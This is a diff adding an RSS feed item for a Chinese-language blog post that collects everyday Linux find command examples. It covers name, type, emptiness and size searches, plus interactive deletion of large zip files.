+      &lt;li&gt;&lt;a href=&quot;#查找所有的一般文件&quot; id=&quot;markdown-toc-查找所有的一般文件&quot;&gt;查找所有的一般文件&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#查找所有的隐藏文件&quot; id=&quot;markdown-toc-查找所有的隐藏文件&quot;&gt;查找所有的隐藏文件&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#查找所有的隐藏目录&quot; id=&quot;markdown-toc-查找所有的隐藏目录&quot;&gt;查找所有的隐藏目录&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#查找比指定文件大的文件&quot; id=&quot;markdown-toc-查找比指定文件大的文件&quot;&gt;查找比指定文件大的文件&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#查找比指定文件小的文件&quot; id=&quot;markdown-toc-查找比指定文件小的文件&quot;&gt;查找比指定文件小的文件&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#查找符合给定大小的文件&quot; id=&quot;markdown-toc-查找符合给定大小的文件&quot;&gt;查找符合给定大小的文件&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#用find命令删除大型打包文件&quot; id=&quot;markdown-toc-用find命令删除大型打包文件&quot;&gt;用find命令删除大型打包文件&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;linux中关于find命令全收集参考&quot;&gt;Linux中关于find命令全收集参考&lt;/h1&gt;
+
+&lt;h2 id=&quot;忽略大小写查找文件&quot;&gt;忽略大小写查找文件&lt;/h2&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find -iname &lt;span class=&quot;s2&quot;&gt;&quot;HelloWorld.java&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;找到文件并执行命令&quot;&gt;找到文件并执行命令&lt;/h2&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find -iname &lt;span class=&quot;s2&quot;&gt;&quot;HelloWorld.java&quot;&lt;/span&gt; -exec md5sum &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;相反匹配&quot;&gt;相反匹配&lt;/h2&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find -maxdepth 1 -not -iname &lt;span class=&quot;s2&quot;&gt;&quot;HelloWorld.java&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;查找空文件0字节&quot;&gt;查找空文件（0字节）&lt;/h2&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find ~ -empty
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;查找5个最大文件&quot;&gt;查找5个最大文件&lt;/h2&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find . -type f -exec ls -s &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\;&lt;/span&gt; | sort -n -r | head -5
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;查找5个最小的文件&quot;&gt;查找5个最小的文件&lt;/h2&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find . -type f -exec ls -s &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\;&lt;/span&gt; | sort -n  | head -5
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;查找所有的目录&quot;&gt;查找所有的目录&lt;/h2&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find . -type d
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;查找所有的一般文件&quot;&gt;查找所有的一般文件&lt;/h2&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find . -type f
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;查找所有的隐藏文件&quot;&gt;查找所有的隐藏文件&lt;/h2&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find . -type f -name &lt;span class=&quot;s2&quot;&gt;&quot;.*&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;查找所有的隐藏目录&quot;&gt;查找所有的隐藏目录&lt;/h2&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find -type d -name &lt;span class=&quot;s2&quot;&gt;&quot;.*&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;查找比指定文件大的文件&quot;&gt;查找比指定文件大的文件&lt;/h2&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find ~ -size +100M
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;查找比指定文件小的文件&quot;&gt;查找比指定文件小的文件&lt;/h2&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find ~ -size -100M
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;查找符合给定大小的文件&quot;&gt;查找符合给定大小的文件&lt;/h2&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find ~ -size 100M
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;用find命令删除大型打包文件&quot;&gt;用find命令删除大型打包文件&lt;/h2&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find / -type f -name &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.zip -size +100M -exec rm -i &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+</description>  
+               <pubDate>Tue, 03 Jan 2017 00:00:00 +0800</pubDate>  
+               <link>http://localhost:4000/2017/01/linux-find-command/</link>  
+               <guid isPermaLink="true">http://localhost:4000/2017/01/linux-find-command/</guid>  
+               </item>  
+          
     </channel>  
 </rss>
